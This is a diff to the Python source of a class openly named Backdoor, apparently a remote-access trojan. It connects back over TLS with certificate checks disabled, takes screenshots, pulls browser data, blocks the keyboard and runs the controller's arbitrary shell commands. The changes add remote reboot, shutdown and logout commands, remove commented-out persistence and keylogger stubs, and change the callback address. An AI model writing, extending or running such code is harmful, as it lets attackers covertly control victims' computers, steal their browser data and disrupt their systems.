@@ -16,37 +16,37 @@ class Backdoor:
         self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
         self.context.minimum_version = ssl.TLSVersion.TLSv1_2
         self.context.maximum_version = ssl.TLSVersion.TLSv1_3
+        self.context.check_hostname = False
+        self.context.verify_mode = ssl.CERT_NONE
         certificate="""-----BEGIN CERTIFICATE-----
-MIIFbTCCA1UCFEJ8NWZeuztRhYmohv/cvc3CeKUjMA0GCSqGSIb3DQEBCwUAMHMx
-CzAJBgNVBAYTAklOMQ4wDAYDVQQIDAVzbWl0azEOMAwGA1UEBwwFc21pdGsxDjAM
-BgNVBAoMBXNtaXRrMQ4wDAYDVQQLDAVzbWl0azEOMAwGA1UEAwwFc21pdGsxFDAS
-BgkqhkiG9w0BCQEWBXNtaXRrMB4XDTI0MDQyOTE4MDUyM1oXDTI0MDUyOTE4MDUy
-M1owczELMAkGA1UEBhMCSU4xDjAMBgNVBAgMBXNtaXRrMQ4wDAYDVQQHDAVzbWl0
-azEOMAwGA1UECgwFc21pdGsxDjAMBgNVBAsMBXNtaXRrMQ4wDAYDVQQDDAVzbWl0
-azEUMBIGCSqGSIb3DQEJARYFc21pdGswggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAw
-ggIKAoICAQC2lPpSUi8Uvo5CGpH9j9fmO6qQOM+zfzSp2hThznwZNJXxprqnZ2Y2
-FKvnOKdrHn1ew09s/atWHSMBlssAdquofxh3h35MNwg0Ku8F4sCUzd/+75SYJGSM
-O4EOgaCv6XHGBgCKVhl1Zrf/SSNAp3GJT2L+6lIIWHJWDiVVUoU5T6/hVKwCb9A7
-eYPKB092lEiQqfBII/uSSwYzbi2TViQPcH0mEVr3N9LN+vUEWrazg9zCoobCYmKG
-QUno49TDEyxWKORMOc79eyLUsR7tKMP0esa4yofwkgnqaGWIlvug+grfHZR70NoJ
-wP0vYbDDYNajAUpgP25tag+NhfWgFdwPDLyjIEbkCOFczuv8BUb3/41j11+bVcSo
-pTv1Uc0LYfESjGidh9WAt6pxlPVokS9UyeQPTZbIHGvEEj/ZckEIQtIU6me57JN2
-xHTkDzz5q8odJS2b1WiefgjMfU7mbgndDySgGj1/Q3N418ltfPpBYpQ60Ez8kgcD
-YVfHr1+ybMv32VrINXhKkV8RBLpa9PzgQZl9hSwCwW9fFuQ8IyWryE0+GWJiRTwh
-B4ThPbclt4n5uCT1gJ212TdCYwvySOeHjCdB4edXwSDi5zPQrwiMEpFBc3rHKiYM
-oM/yF7yop66c6Niwg1dAqsVpOww0Xlkc0aw+FWZf1sDquZvvG6jSMwIDAQABMA0G
-CSqGSIb3DQEBCwUAA4ICAQAdCLRkDRW2AIwv2oTOnUPwZmn5ealHkOrxVu/744wa
-ENrO5sZYyCUwdrRlg9JHtmz2uEVIwffRZ07Ncnz/TRwj0nVtf/xInEimsaH0135f
-ajEQp+JUqMsuIg7lpqKSseB13O61KRvMmBj5P/4xmanXDyNhAtUT7lzCEbG9I8qL
-ttCk2JFnG1Hr2MivCU1BHPbQ+JFvR0G80D7hJkS4xmJIyWVNcM/j4R2M40s1u/HX
-YwObazsyOP0Hk9GmiDi6OVAKToxTY059dYPWEXTMRY0DfGiRgA1yuw95g61US8od
-ge8l6mruAe2IALUN3qmQWiWMmU1F1SMu/da/il8Sj1yA3ypp7Cmdh1x/mruLi0lR
-ta0Bkle/rLSyR2ZeYHuH1lm59C7OIUetiQpMsWM4k895/UItWSMsGAM9jC9kaSZL
-JpRMxYvAEOP7vK44K3OfosOMHnCtL6OKvF83fwlxwBPkwQhz9khG5+epiACkSuoz
-DOnl50OsQUwcdieBwjOLvDELkae3iyc5UltRiAy8mzyjVPjAknf/ELrUQZNPnK+5
-uILUthkgdGdyfL4/HFIjqbArZg39hHk6k2619duMsMQWMgEPbXG2O1J6RnR4/DgP
-1zcxGKkdLR0J9c7N0Y9PgPT9Emynn2ZQEN1MHAMT+vjqpUoor/bxz7f35IhZbFrm
-FA==
+MIIFOTCCAyGgAwIBAgIUS7IfEljDpgZsah7HFpj1MX+p5uIwDQYJKoZIhvcNAQEL
+BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
+GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDA3MjIwNDExMjdaFw0yNDA4
+MjEwNDExMjdaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
+HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEB
+AQUAA4ICDwAwggIKAoICAQCqKLvS7vVEuZJtV2q8LDzQzJdsszhWWudBRUfjDxtZ
+uqwQqIdoqRl2nNY9yarNH4btjvV+fiVrg9czHr/qBumm5oyWYK5DPMEYkHJAtEB3
+BAsqCxNGE4s0FF4ljJsSt3WjLMuwnmhNvWrwm4JKkxcKKiB6NQ4CZkr/3uzwsqY/
+9EGKfHQfa3UOmZejLtd6OyFwlUWRR/mGTSf93q/fvIriMmBo2cWz60iNntL1NlpP
+xJ1teTQWtxh/yUrRR1uEgKRFLsy2Oc45B9/vsrrrEj4R+kEPHclp1oUhq29Rp3Qq
+VzB8TtCGSfmzZHFYhYpmLTFSxUI8GNfFwPB0TstNw3OCwmnpBE8q19uQ4ThAUKvT
+grJPbQTqmASimlK6idPIPWFbtz6UO1fT9+gLXNzXW0QpbFyXNh/wIoFROA0S1TMB
+bmR0qJM/82wc2Wz0d53ZYQLrLzBvhN3zfy9GC95W6U1myHmo6zJqlRqPRVae3II8
+KS+p5Oln7hnx2HLFi4PCEkHEcDzYic4pzHUskAq+HM7gWCjEgrMtEeDi0GpDYh2r
++PXF+mll7N89+ddp5FyQ27fLRvkNP+ayPYMEU51M7SDHV/sntpQG2A/jXMQsToAt
+ARwTkcT5V3XfpWfU2etBmWZ9uzuqx/FlRiDDBR1y30wI89T2xjmNbJtSRi/8jqkJ
++wIDAQABoyEwHzAdBgNVHQ4EFgQUx9fqmH5I5xUkpkGNv8THGBGT514wDQYJKoZI
+hvcNAQELBQADggIBAJEmoBd7HAHTfRfZpyAahIo/5cjD/FIwYtpFkPCJvlD4OL8v
+s0JSS/E+XhrCDVYm7dbKN0UmM3i6a+XLDRcIjJVZ9x/Dhee5bSmQEb9obVGJJwK3
+itmH9MTLXpMBAR3QQN1FbEdRrrN0asrZFmLjnw1ZrFdfiRaO//bC8Xz3hciLnEkd
+B8r6n86baIk3xnQj5BmbARxPc75dQ1mh1RmNPn8wcQzkmukRhBkxKmRUf/t5Sbn5
+MStYeUlL/qMX5OqWUhoRkt4yMJMIIl4o5MvVXTo1EwF7x51SnHhfAoNIQCuDZLXU
+segQjVQp54uLfqj9wYvzyQ9fQ1b6bOJeoEAemhNqfKBNhbb4/nEPqBbCTZ+2TZHh
+n9WwC9ZsXjsl3BwJ7h+I7AwSV0doRXjD/pFlTXUJzRXPuT/anBY1SwqvHTp1Qiyb
+H/LqSoRXJPmQPt9lWOip21BfIO7I7eFTOYdwts9R8karA0Wc8l7B0tSZ5vJzsjiX
+sfBGSntIbRDeywW5rPcUEhrPiR5z1CIMehYDi0DdMQ726d+RlQC68VU7pW0H2RJV
+g90c1vee0M/llwFueGdn4SJjeo17yWcO8PH4tawLEHdjQRycD93Ygn4lcSHac1wI
+QWiW0ZSeAk3ShZ0CvBwH5iMHrpUwVmXd6JAGLYbTsR/5ar3VKxEUb/yHhCba
 -----END CERTIFICATE-----
 """
         self.context.load_verify_locations(cadata=certificate)
@@ -54,8 +54,6 @@ FA==
         self.connection= self.context.wrap_socket(self.connection, server_hostname='smitk')
         self.connection.connect((ip,port))
         self.Send("bakara")
-        # self.add_persistent()
-        # self.keylogger_thread=None
     
     def BrowserData(self,type):
         br=browser()
@@ -73,7 +71,7 @@ FA==
         json_data=""
         while True:
             try:
-                json_data=json_data+self.connection.recv(1024).decode("utf-8")
+                json_data=json_data+self.connection.recv(4096).decode("utf-8")
                 return json.loads(json_data)
             except ValueError:
                 continue
@@ -142,6 +140,15 @@ FA==
             keyboard.block_key(i)
         return "[+] Keyboard disabled"
     
+    def reboot(self):
+        return os.system("shutdown /r /t 1")
+    
+    def shutdown(self):
+        return os.system("shutdown /s /t 1")
+    
+    def LogOut(self):
+        return os.system("shutdown -l")
+    
     def EnableKeyboard(self):
         for i in range(150):
             keyboard.unblock_key(i)
@@ -172,11 +179,16 @@ FA==
                     command_result=self.Screenshot()
                 elif command[0]=="browser":
                     command_result=self.BrowserData(command[1])
+                elif command[0]=="disable_keyboard":
+                    command_result=self.DisableKeyboard()
+                elif command[0]=="reboot":
+                    command_result="[]"+self.reboot()
+                    
                 else:
                     command_result=self.RunShellCommand(command).decode("utf-8")
             except Exception as e:
                 command_result="[-] Bakara ERR : \n%s"%str(e)
             self.Send(command_result)
 
-my_backdoor=Backdoor("192.168.56.1",8080)
+my_backdoor=Backdoor("127.0.0.1",8080)
 my_backdoor.run()
